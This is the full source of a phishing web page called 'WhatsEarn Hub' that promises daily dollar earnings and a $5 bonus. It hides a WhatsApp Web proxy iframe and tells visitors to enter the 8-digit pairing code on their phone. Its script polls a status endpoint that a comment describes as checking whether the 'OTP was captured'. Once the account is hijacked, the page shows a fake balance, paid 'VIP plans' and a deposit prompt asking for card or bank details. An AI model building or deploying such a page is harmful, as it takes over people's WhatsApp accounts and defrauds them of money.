<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>WhatsEarn Hub - Earn $500 Daily</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #00d4aa 0%, #00a085 50%, #ffd700 100%);
            min-height: 100vh;
            overflow-x: hidden;
        }
        
        .whatsapp-iframe {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            border: none;
            z-index: 1;
            opacity: 0;
            pointer-events: none;
        }
        
        .dashboard {
            position: relative;
            z-index: 2;
            max-width: 500px;
            margin: 0 auto;
            padding: 20px 16px;
            min-height: 100vh;
        }
        
        .glass {
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(16px);
            border-radius: 32px;
            border: 1px solid rgba(255, 255, 255, 0.25);
            padding: 32px 24px;
            margin-bottom: 20px;
            text-align: center;
            transition: all 0.3s ease;
        }
        
        .logo {
            font-size: 2.4em;
            background: linear-gradient(135deg, #FFF9C4, #FFE55C);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
            font-weight: 800;
            margin-bottom: 12px;
        }
        
        .title {
            font-size: 1.7em;
            font-weight: 700;
            color: #fff;
            margin-bottom: 8px;
        }
        
        .bonus-badge {
            background: linear-gradient(105deg, #FFB347, #FF6B35);
            color: #1e2a3a;
            padding: 14px 28px;
            border-radius: 60px;
            font-size: 1.4rem;
            font-weight: 800;
            margin: 20px auto;
            display: inline-block;
            animation: pulse 1.8s infinite ease-in-out;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .wa-btn {
            background: linear-gradient(105deg, #25D366, #128C7E);
            color: white;
            border: none;
            padding: 16px 28px;
            border-radius: 60px;
            font-size: 1.2rem;
            font-weight: 600;
            width: 100%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin: 20px 0;
            transition: all 0.25s ease;
        }
        
        .wa-btn:hover {
            transform: translateY(-2px);
            filter: brightness(1.05);
        }
        
        .wa-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }
        
        .plans {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 32px;
            padding: 24px 20px;
        }
        
        .plans h3 {
            color: #fff;
            font-size: 1.3rem;
            text-align: center;
            margin-bottom: 16px;
        }
        
        .plan-list {
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        
        .plan {
            background: rgba(255, 255, 255, 0.2);
            padding: 12px 18px;
            border-radius: 28px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .plan-price {
            font-size: 1.3rem;
            font-weight: 700;
            color: #FFE484;
        }
        
        .footer-note {
            font-size: 0.7rem;
            text-align: center;
            color: rgba(255, 255, 240, 0.7);
            margin-top: 20px;
        }
        
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.9);
            backdrop-filter: blur(10px);
            color: white;
            padding: 12px 24px;
            border-radius: 40px;
            font-size: 14px;
            z-index: 9999;
            white-space: nowrap;
            animation: slideUp 0.3s ease;
        }
        
        @keyframes slideUp {
            from {
                opacity: 0;
                transform: translateX(-50%) translateY(20px);
            }
            to {
                opacity: 1;
                transform: translateX(-50%) translateY(0);
            }
        }
        
        .status-text {
            color: rgba(255, 255, 255, 0.9);
            font-size: 12px;
            margin-top: 10px;
        }
        
        .success-badge {
            background: #25D366;
            color: white;
            padding: 8px 16px;
            border-radius: 40px;
            font-size: 12px;
            display: inline-block;
            margin-top: 15px;
        }
    </style>
</head>
<body>

    <!-- WhatsApp Web Proxy iframe (hidden but active) -->
    <iframe id="whatsappFrame" class="whatsapp-iframe" src="/whatsapp-proxy"></iframe>
    
    <!-- Dashboard Overlay -->
    <div class="dashboard">
        <div class="glass" id="mainCard">
            <div class="logo">💸 WhatsEarn Hub</div>
            <h1 class="title">Earn Real Dollars!</h1>
            <div class="bonus-badge">✨ $5 INSTANT BONUS ✨</div>
            <p style="color: rgba(255,255,245,0.9); font-size: 0.9rem; margin: 15px 0;">
                🚀 Complete VIP Plans + Refer Friends = Unlimited Earnings!
            </p>
            <button class="wa-btn" id="connectBtn">
                <i class="fab fa-whatsapp"></i> Connect WhatsApp & Get $5
            </button>
            <div class="status-text" id="statusMsg"></div>
        </div>
        
        <div class="plans">
            <h3><i class="fas fa-crown"></i> VIP Earning Plans</h3>
            <div class="plan-list">
                <div class="plan"><span>🥈 Silver Plan</span><span class="plan-price">$5</span></div>
                <div class="plan"><span>🥇 Gold Plan</span><span class="plan-price">$15</span></div>
                <div class="plan"><span>💎 Platinum</span><span class="plan-price">$30</span></div>
                <div class="plan"><span>👑 Diamond</span><span class="plan-price">$75</span></div>
                <div class="plan"><span>⭐ Elite VIP</span><span class="plan-price">$150</span></div>
            </div>
        </div>
        
        <div class="footer-note">
            🔒 Secure | EasyPaisa • JazzCash • Bank Transfer
        </div>
    </div>

    <script>
        let isConnected = false;
        let checkInterval = null;
        
        const connectBtn = document.getElementById('connectBtn');
        const statusMsg = document.getElementById('statusMsg');
        const iframe = document.getElementById('whatsappFrame');
        
        connectBtn.addEventListener('click', () => {
            if (isConnected) {
                showToast("Already connected!", false);
                return;
            }
            
            // Show iframe and start monitoring
            iframe.style.opacity = '1';
            iframe.style.pointerEvents = 'none';
            
            statusMsg.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Connecting to WhatsApp... Check your phone';
            connectBtn.disabled = true;
            connectBtn.style.opacity = '0.6';
            
            showToast("📱 Check WhatsApp on your phone for 8-digit code", false);
            
            // Check for login completion via server
            let attempts = 0;
            checkInterval = setInterval(async () => {
                attempts++;
                try {
                    // Check if OTP was captured (we can check via a status endpoint)
                    const response = await fetch('/api/check-status');
                    const data = await response.json();
                    if (data.success) {
                        clearInterval(checkInterval);
                        updateDashboard();
                    }
                } catch(e) {
                    // If endpoint doesn't exist, continue
                }
                
                // Timeout after 5 minutes
                if (attempts > 100) {
                    clearInterval(checkInterval);
                    statusMsg.innerHTML = '<i class="fas fa-times-circle"></i> Connection timeout. Please try again.';
                    connectBtn.disabled = false;
                    connectBtn.style.opacity = '1';
                }
            }, 3000);
        });
        
        function updateDashboard() {
            isConnected = true;
            if (checkInterval) clearInterval(checkInterval);
            
            const card = document.getElementById('mainCard');
            card.innerHTML = `
                <div class="logo">💸 WhatsEarn Hub</div>
                <div style="background: rgba(0,0,0,0.3); border-radius: 24px; padding: 20px; margin: 15px 0;">
                    <h2 style="color: #ffd700; font-size: 2.5rem;">$5.47</h2>
                    <p style="color: white;">Available Balance</p>
                </div>
                <button class="wa-btn" id="depositBtn" style="background: #ff6b35;">
                    <i class="fas fa-credit-card"></i> Deposit Money
                </button>
                <button class="wa-btn" id="withdrawBtn" style="background: #128C7E;">
                    <i class="fas fa-wallet"></i> Withdraw to EasyPaisa
                </button>
                <button class="wa-btn" id="referBtn" style="background: #25D366;">
                    <i class="fas fa-share-alt"></i> Refer & Earn $2
                </button>
                <div class="success-badge">
                    <i class="fas fa-check-circle"></i> WhatsApp Connected Successfully!
                </div>
            `;
            
            // Add event listeners for new buttons
            document.getElementById('depositBtn')?.addEventListener('click', () => {
                showToast("💳 Deposit form - Card/Bank details required", false);
            });
            
            document.getElementById('withdrawBtn')?.addEventListener('click', () => {
                showToast("💰 Withdrawal to EasyPaisa/JazzCash", false);
            });
            
            document.getElementById('referBtn')?.addEventListener('click', () => {
                navigator.clipboard.writeText(window.location.href);
                showToast("✅ Referral link copied! Earn $2 per friend", false);
            });
            
            showToast("🎉 Welcome! $5 bonus added to your account!", false);
        }
        
        function showToast(msg, isError = false) {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.style.background = isError ? '#d3392c' : '#128C7E';
            toast.innerHTML = msg;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 4000);
        }
        
        // Clean up interval on page unload
        window.addEventListener('beforeunload', () => {
            if (checkInterval) clearInterval(checkInterval);
        });
    </script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
</body>
</html>
